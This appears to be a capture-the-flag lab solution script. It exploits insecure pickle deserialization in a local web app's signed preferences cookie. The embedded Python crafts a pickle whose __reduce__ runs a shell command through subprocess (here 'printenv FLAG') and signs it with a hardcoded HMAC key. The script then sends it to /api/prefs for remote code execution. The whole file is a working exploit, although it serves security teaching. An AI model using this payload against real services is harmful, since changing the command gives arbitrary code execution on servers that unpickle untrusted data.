#!/usr/bin/env bash
# Lab 40 — a pickle is a program; the signature only decides who may run one.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9400}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab40

open_lab "$SESSION" "$URL/"

COOKIE="$(python3 - <<'PY'
import base64, hashlib, hmac, pickle, subprocess

SECRET = b"prefs-signing-key"

class Payload:
    # `__reduce__` tells pickle how to rebuild this object: by calling the
    # returned callable with the returned arguments. Any callable will do.
    def __reduce__(self):
        return (subprocess.check_output, (["printenv", "FLAG"],))

raw = pickle.dumps(Payload())
mac = hmac.new(SECRET, raw, hashlib.sha256).hexdigest()[:16]
print(base64.urlsafe_b64encode(raw).decode().rstrip("=") + "." + mac)
PY
)"

send "$SESSION" "$REQ0" --create --set path=/api/prefs --set "cookie.prefs=$COOKIE" | flag
